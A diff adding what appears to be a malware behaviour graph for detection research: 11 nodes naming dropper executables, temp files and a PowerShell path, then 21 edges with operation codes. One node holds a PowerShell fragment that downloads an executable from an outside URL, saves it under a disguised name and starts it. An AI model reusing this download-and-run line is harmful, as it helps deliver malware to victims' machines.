@@ -1,0 +1,35 @@
+11
+MP*-Ayuaey.exe 
+MF-C:\Windows\System32\windowspowershell\v1
+SO-http://hiqsolution.com/kiner.exe','C:\Users\admin\AppData\Roaming\mozilla.exe');Start-Process
+SF-C:\Program files\appdata\local\temp\14612
+MP*-jww825a.exe 
+MP*-Order Confirmation.exe 
+SF-C:\Users\admin\AppData\Local\Temp\script
+MF-files\appdata\local\temp\10805.bmp
+MF-system_file.exe
+MF-C:\Users\admin\AppData\Local\Temp\GLJC215
+MP*-Dropper.exe 
+21
+0 1 EX
+2 0 RF
+0 3 RD
+0 4 FR
+4 1 WR
+4 2 ST
+4 3 UK
+0 5 FR
+5 1 RD
+2 5 RF
+0 6 WR
+5 6 RD
+0 7 WR
+5 7 CD
+0 8 EX
+5 8 WR
+0 9 WR
+5 9 RD
+10 1 RD
+2 10 RF
+5 10 UK
+
